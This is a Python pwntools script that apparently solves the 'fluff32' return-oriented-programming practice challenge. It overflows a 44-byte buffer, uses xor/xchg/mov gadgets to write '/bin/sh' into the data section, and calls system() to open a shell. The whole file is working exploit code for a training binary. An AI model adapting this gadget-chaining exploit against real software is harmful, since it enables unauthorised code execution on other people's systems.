#!/usr/bin/python

from pwn import *

c = process("./fluff32")
#gdb.attach(c)

system = 0x0804865a
system_plt = 0x08048430
data = 0x0804a028

mov = 0x08048693	# mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
pop_ebx = 0x080483e1	# pop ebx; ret;
xor_edx = 0x08048671	# xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
xor_edx_ebx = 0x0804867b	# xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
xchg_edx_ecx = 0x08048689	# xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;

offset = 44

payload = "a"*offset
payload += p32(xor_edx)
payload += "AAAA"
payload += p32(pop_ebx)
payload += p32(data)
payload += p32(xor_edx_ebx)
payload += "AAAA"
payload += p32(xchg_edx_ecx)
payload += "AAAA"
payload += p32(xor_edx)
payload += "AAAA"
payload += p32(pop_ebx)
payload += "/bin"
payload += p32(xor_edx_ebx)
payload += "AAAA"
payload += p32(mov)
payload += "AAAA"
payload += p32(0)
payload += p32(xor_edx)
payload += "AAAA"
payload += p32(pop_ebx)
payload += p32(data+4)
payload += p32(xor_edx_ebx)
payload += "AAAA"
payload += p32(xchg_edx_ecx)
payload += "AAAA"
payload += p32(xor_edx)
payload += "AAAA"
payload += p32(pop_ebx)
payload += "/sh\x00"
payload += p32(xor_edx_ebx)
payload += "AAAA"
payload += p32(mov)
payload += "AAAA"
payload += p32(0)

payload += p32(system)
# payload += "AAAA"
payload += p32(data)

c.sendline(payload)

c.interactive()
